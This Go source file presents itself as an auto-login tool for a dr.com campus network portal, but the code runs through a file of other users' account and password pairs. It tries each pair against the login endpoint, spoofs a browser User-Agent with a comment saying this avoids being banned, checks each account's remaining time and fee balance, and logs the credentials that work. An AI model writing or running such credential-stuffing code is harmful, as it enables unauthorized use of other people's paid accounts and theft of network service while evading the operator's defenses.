//CCMU Automatic Connector
//
//This tool provides automatic login feature for
//connect to the network authenticated by dr.com
//
//Author: ms2008vip@gmail.com at 2016/11/8 16:54:29
//

//go:generate goversioninfo -icon=cover.ico

package main

import (
    "fmt"
    "net/http"
    "net/url"
    "os"
    "bufio"
    "io/ioutil"
    "strings"
    "strconv"
    "regexp"
    "math/rand"
    "time"
    l4g "github.com/alecthomas/log4go"
    "github.com/toqueteos/webbrowser"
)

const (
    URL = "http://192.168.161.2/"
    FILE = "ids.txt"
)

var log = make(l4g.Logger)
var buildstamp string = ""
var githash string = ""

func init() {
    log.AddFilter("stdout", l4g.DEBUG, l4g.NewConsoleLogWriter())
    log.AddFilter("file", l4g.INFO, l4g.NewFileLogWriter("connect.log", false))
}

func main() {
    defer log.Close()

    args := os.Args
    if len(args)==2 && (args[1]=="--version" || args[1] =="-v") {
        fmt.Printf("Git Commit Hash: %s\n", githash)
        fmt.Printf("UTC Build Time: %s\n", buildstamp)
        return
    }
    fmt.Println("os args:", os.Args)

    // 程序重启需要注销上次的用户
    checkOut()
    userList := fileTolines(FILE)
    rand.Seed(time.Now().Unix())
    //fmt.Println(userList)
    count := 1
    isCheckIn := false

    for {

        if count == 1 && len(userList) == 1 && strings.TrimSpace(userList[0]) == "\xef\xbb\xbf" {
            fmt.Println("密码库是空的！")
            fmt.Println("按下「回车键」终止本程序")
            fmt.Scanln()
            return
        } else if len(userList) == 0 {
            fmt.Println("你的学弟学妹们都太抠了，连费都舍不得充！")
            fmt.Println("按下「回车键」终止本程序")
            fmt.Scanln()
            return
        }

        // 速率限制
        // if count%1000 == 0 {
        //     fmt.Printf("processed at least %d iterms\n", count)
        //     <- time.After(5 * time.Second)
        //     fmt.Println("go on....")
        // }

        // 注销上次的用户
        if isCheckIn == true {
            checkOut()
            isCheckIn = false
        }

        n := rand.Intn(len(userList))
        line := userList[n]

        // 将测试过的用户移除出当前密码库
        userList = append(userList[:n], userList[n+1:]...)
        count++

        //userInfo := strings.Split(line, "\t")
        userInfo := strings.Fields(line)
        if len(userInfo) < 2 {
            log.Critical("shit happens: unrecognized user info format: %v", userInfo)
            continue
        }
        account := userInfo[0]
        password := userInfo[len(userInfo)-1]
        //username := userInfo[1]

        //fmt.Println(account, password, username)
        //log.Info(line)
        if succ := checkPasswd(account, password); succ {
            isCheckIn = true
            balanceInfo := getBalance()
            fmt.Println(account, password, "Used Time:", balanceInfo[0], "Balance:", balanceInfo[1])

            if balanceInfo[0] >= 2400 && balanceInfo[1] == 0 {
                //fmt.Println(account, "time exceed!")
            } else {
                log.Info("%s\t%s\tUsed Time:%d\tBalance:%.1f", account, password, int(balanceInfo[0]), balanceInfo[1])
                webbrowser.Open(URL)
                break
            }
        } else {
            fmt.Println(account, "login failed!")
        }
    }

    fmt.Println("看到这个，就是想证明下我不是个恶意程序，5s 之后就看不到我啦 :-)")
    <- time.After(5 * time.Second)
}

func fileTolines(filePath string) []string {
    f, err := os.Open(filePath)
    if err != nil {
        //panic(err)
        fmt.Println("没有发现密码库文件！")
        fmt.Println("按下「CTRL + C」终止本程序")
        fmt.Scanln()
    }
    defer f.Close()

    var lines []string
    scanner := bufio.NewScanner(f)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    if err := scanner.Err(); err != nil {
        fmt.Fprintln(os.Stderr, err)
    }

    return lines
}

func chunkTolines(chunk string) []string {
    var lines []string
    lines = strings.Split(chunk, "\n")

    return lines
}

func checkPasswd(user, passwd string) bool {
    defer func() {
        if p := recover(); p != nil {
            err := p.(error)
            log.Critical("shit happens: %v [user: %s pass: %s]", err, user, passwd)
        }
    }()

    client := &http.Client{
        Timeout: time.Duration(10 * time.Second),
    }

    // 构造认证请求
    form := url.Values{}
    form.Add("DDDDD", user)
    form.Add("upass", passwd)
    form.Add("0MKKey", "")

    req, err := http.NewRequest("POST", URL, strings.NewReader(form.Encode()))
    // 防止被 dr.com banned
    req.Header.Set(`User-Agent`, `Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36`)
    req.Header.Set(`Referer`, URL)

    resp, err := client.Do(req)
    if err != nil {
        log.Error("failed to sent post request due to %s [user: %s pass: %s]", err, user, passwd)
        return false
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Error("failed to read login response body due to %s [user: %s pass: %s]", err, user, passwd)
        return false
    }
    //fmt.Println(string(body))

    // 判断认证是否通过
    line := chunkTolines(string(body))[5]
    if string(line[1]) == "s" {
        // 认证通过
        return true
    } else if string(line[1]) == "S" {
        return false
    } else {
        log.Warn("unexpected response! [user: %s pass: %s]", user, passwd)
        return false
    }
}

func getBalance() [2]float64 {
    defer func() {
        if p := recover(); p != nil {
            err := p.(error)
            log.Critical("shit happens: balance calc failed %v", err)
        }
    }()

    balanceInfo := [2]float64{0, 0}
    res, err := http.Get(URL)
    if err != nil {
        log.Error("failed to get balance info due to %s", err)
        return balanceInfo
    }

    result, err := ioutil.ReadAll(res.Body)
    defer res.Body.Close()
    if err != nil {
        log.Error("failed to read balance response body info due to %s", err)
        return balanceInfo
    }

    // 抓取已用时间
    line := chunkTolines(string(result))[6]
    re := regexp.MustCompile(`time='(\d+) *';`)
    usedTime, _ := strconv.ParseFloat(re.FindStringSubmatch(line)[1], 64)
    balanceInfo[0] = usedTime

    // 抓取余额
    re = regexp.MustCompile(`;fee='(\d+) *';`)
    fee, _ := strconv.Atoi(re.FindStringSubmatch(line)[1])
    amount := (fee - fee%100) / 10000
    balanceInfo[1] = float64(amount)

    return balanceInfo
}

func checkOut() {
    client := &http.Client{
        Timeout: time.Duration(5 * time.Second),
    }

    _, err := client.Get(URL+"F.htm")
    if err != nil {
        log.Error("failed to check the latest session out due to %s", err)
    }
}
